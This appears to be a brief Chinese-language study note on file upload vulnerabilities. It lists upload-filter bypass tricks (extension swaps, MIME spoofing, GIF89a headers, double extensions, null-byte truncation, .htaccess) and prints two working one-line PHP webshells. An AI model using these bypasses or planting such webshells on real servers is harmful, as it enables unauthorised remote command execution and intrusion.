+++
title = "文件上传漏洞"
description = "文件上传漏洞绕过技巧。"
date = 2026-06-21T00:00:00.000Z
+++

## 文件上传漏洞

文件上传漏洞是指用户上传的文件未经严格验证，导致恶意文件被上传到服务器。

### 绕过方法

- 修改文件后缀名（php → php3、php5、phtml）
- 修改 MIME 类型
- 利用文件头（GIF89a）
- 双重后缀名（shell.php.jpg）
- 空字节截断（shell.php%00.jpg）
- .htaccess 文件上传

### 一句话木马

```php
<?php eval($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
```
